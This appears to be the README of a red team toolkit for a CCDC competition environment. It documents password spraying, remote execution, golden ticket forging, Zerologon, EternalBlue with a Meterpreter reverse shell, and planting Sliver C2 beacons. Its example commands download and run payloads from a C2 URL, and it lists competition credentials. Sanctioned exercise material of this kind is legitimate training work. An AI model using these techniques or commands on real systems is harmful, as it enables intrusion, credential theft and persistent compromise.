# CCDC Red Team Scripts

Toolkit for Aperture Science Labs CCDC environment. All scripts target `192.168.20<TEAM>.*` hosts by default. Use the `-x` flag on any script to target internal `172.16.x.x` IPs through proxychains.

Run `source setup.sh` once to make every script executable and register short aliases.

## Environment

- **Domain**: `aperturesciencelabs.org`
- **Default creds**: `Th3cake1salie!`
- **DA accounts**: Administrator, caroline, cave, chell, glados, wheatley
- **C2**: Sliver (mTLS beacons — `session.exe` + `beacon.exe`)
- **External IPs**: `192.168.20<TEAM>.<octet>`
- **Internal IPs**: `172.16.{1,2,3}.<octet>` (via `-x` + proxychains)

## Internal IP Map (for `-x` / proxychains)

| Host | Role | Internal IP | Subnet |
|------|------|------------|--------|
| curiosity | DC (Win Server 2016) | 172.16.3.140 | Workstation |
| morality | Win Server 2016 | 172.16.1.10 | DMZ |
| intelligence | Win Server 2019 | 172.16.1.11 | DMZ |
| anger | Win Server 2019 | 172.16.2.70 | Internal |
| fact | Win Server 2022 | 172.16.2.71 | Internal |
| space | Windows 10 | 172.16.3.141 | Workstation |
| adventure | Windows XP (pivot) | 172.16.2.72 | Internal |
| schrodinger | OPNSense 25.7 | 172.16.1.1 / .2.1 / .3.1 | Router |

---

## setup — Environment Setup

Sources into your shell to make all scripts executable and register short aliases.

```
source setup.sh
```

After sourcing, you can use `spray 5` instead of `./spray.sh 5`, etc.

---

## spray — Password Spray

Sprays credentials across all team boxes. Uses netexec for SMB/WinRM/WMI and hydra for SSH/RDP. DA accounts are tried first. Stops on first hit by default. If spraying a host takes longer than 30 seconds, you'll be prompted to skip it.

```
spray <team> [-a] [-x] [-u user] [-s host] ...
```

| Flag | Description |
|------|-------------|
| `-a` | Continue spraying after first hit (full coverage) |
| `-u USER` | Prepend extra user(s) to spray list (repeatable) |
| `-s HOST` | Skip this host — name or number 1-7 (repeatable) |
| `-x` | Use internal 172.16.x.x IPs (via proxychains) |

**30s auto-skip:** If any single host takes >30s to spray, you're prompted to skip it (Y/n, auto-continues after 10s).

Requires `users.txt` and `passwords.txt` in the current directory.

Examples:
```bash
spray 5                          # spray all hosts, stop on first hit per host
spray 5 -a                       # full spray, don't stop on hits
spray 5 -s morality -s adventure # skip morality and adventure
spray 5 -s 2 -s 7               # same thing, by number
```

---

## exec — Remote Command Execution

Runs a command on a single host, cycling through protocols until one works: SMB → WinRM → WMI → smbexec → RDP → SSH. Tries DA accounts first, then `users.txt`.

```
exec <team> [host] [-c "command"] [-p password_or_hash] [-s] [-x]
```

| Flag | Description |
|------|-------------|
| `-c CMD` | Command to run (default: `whoami /all`) |
| `-p PASS` | Password or NTLM hash (default: `Th3cake1salie!`) |
| `-s` | Shell mode — drop into interactive shell on first successful auth |
| `-x` | Use internal 172.16.x.x IPs (via proxychains) |

Host can be a name (`curiosity`, `anger`, etc.) or number (1–7). Omit host to list all boxes.

---

## forgegold — Golden Ticket Forge

Forges Kerberos golden tickets using impacket. Extracts the krbtgt hash from the DC, then generates a `.ccache` and a ready-to-use helper script per team.

```
forgegold [-z] [-x] <team | all> [user:password]
```

| Flag | Description |
|------|-------------|
| `-z` | Use `zero.sh` dump output for offline forge (no live DC auth needed) |
| `-x` | Use internal 172.16.x.x IPs (generated use-scripts will have internal IPs) |
| `all` | Forge tickets for teams 1–5 in one run |

**Generated use-scripts** (`team<N>_use.sh`) include an interactive weapon menu:

| Option | Action |
|--------|--------|
| 1–3 | smbexec / psexec / wmiexec shell → target |
| 4 | evil-winrm → target |
| 5 | secretsdump → DC |
| 6–7 | netexec SMB / WinRM auth sweep (all hosts) |
| 8 | xfreerdp RDP → target |
| c | **Plant C2** — downloads + unzips + executes Sliver zip on selected host via planter.sh |
| t | Change target host |
| p | Print all copy-paste command templates |
| 9 | bash shell with ticket pre-exported |

---

## zero — Zerologon Exploit

Runs CVE-2020-1472 against the DC (`CURIOSITY$`) to zero the machine account password, then optionally dumps all domain hashes via secretsdump.

```
zero [-d | -jd] [-x] <team | all>
```

| Flag | Description |
|------|-------------|
| `-d` | Dump hashes after exploit |
| `-jd` | Just dump (skip exploit — DC must already be zeroed) |
| `-x` | Use internal 172.16.x.x IPs (via proxychains) |

---

## planter — Beacon Planter

Plants C2 binaries on one or all team boxes. Auto-detects golden ticket, falls back to explicit creds or DA spray. Tries multiple transfer and execution methods per binary. Results stream live as each host completes.

```
planter <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b binary] [-x] [-v]
```

| Flag | Description |
|------|-------------|
| `-p PASS` | Password or NTLM hash |
| `-u USER` | Specify user (default: `Administrator`) |
| `-w URL` | HTTP URL to download beacon (enables URL-only fast path if no local .exe files exist) |
| `-b FILE` | Plant only this specific binary (e.g. `-b session.exe`) |
| `-x` | Use internal 172.16.x.x IPs (via proxychains) |
| `-v` | Verbose/debug mode — show commands, timings, nxc output |

**Auth priority:** golden ticket (`team<N>.ccache`) → explicit `-p` creds → DA password spray

**Transfer methods (tried in order):** SMB put → WinRM base64 upload → certutil from URL → PowerShell IWR from URL → SCP (SSH)

**Exec methods:** SMB → WinRM → WMI → smbexec → SSH

**URL-only fast path:** When `-w` is specified and no local `.exe` files exist, planter fires a single download+exec one-liner per host instead of the full transfer cascade. This is significantly faster.

**Zip support:** If the `-w` URL ends in `.zip`, planter automatically downloads, extracts, and runs every `.exe` inside the archive. Uses `tar -xf` / `Expand-Archive` on Windows, `unzip` / `python3 zipfile` on Linux.

**Live output:** When targeting multiple hosts in parallel, results stream to the terminal as each host finishes — no more waiting for the slowest host to see results.

Examples:
```bash
planter 5                                          # plant all .exe on all boxes
planter 5 curiosity                                # plant on DC only
planter 5 -w http://c2:8080/beacon.exe             # URL-only fast path (direct .exe)
planter 5 -w http://c2:8080/payload.zip            # URL-only fast path (zip: unzip+exec)
planter 5 -p aad3b435b51404eeaad3b435b51404ee:HASH # pass-the-hash
planter 5 -v                                       # verbose timing/debug output
```

---

## ligo — EternalBlue + Meterpreter Pivot

> **⚠️ UNTESTED** — This script has not been validated in the live environment. The EternalBlue exploit may fail depending on target patch level, and SOCKS proxy setup may require manual adjustment. Use with caution and verify each step.

Exploits Adventure XP box (`.72`) via EternalBlue (MS17-010), sets up Meterpreter reverse shell with autoroute and SOCKS proxy for proxychains pivoting into internal networks.

```
ligo <team | all> [attacker_ip]
```

Generates per-team:
- `proxychains_team<N>.conf` — proxychains config pointing to SOCKS5 on `127.0.0.1:109<N>`
- `team<N>_proxy.sh` — helper script with aliases (`pc<N>`, `p<N>`) for easy proxychains use

Attacker IP auto-detected if omitted. Use `all` to exploit teams 1–5.

**Workflow:** Run `ligo 5`, wait for SOCKS proxy, then `source team5_proxy.sh` and use `pc5 netexec smb 172.16.3.140 ...`

---

## pivot — Rapid Pivot Switcher (Sliver)

> **⚠️ UNTESTED** — This script has not been validated in the live environment. Assumes a Sliver SOCKS5 pivot is already running on the DC beacon. May need port or config adjustments in practice.

Configures proxychains to route through a Sliver SOCKS5 pivot running on a team's DC beacon. For EternalBlue/Meterpreter pivots, use `ligo` instead.

```
pivot <team> [port]
```

Port defaults to `108<team>` (e.g. team 5 → `1085`).
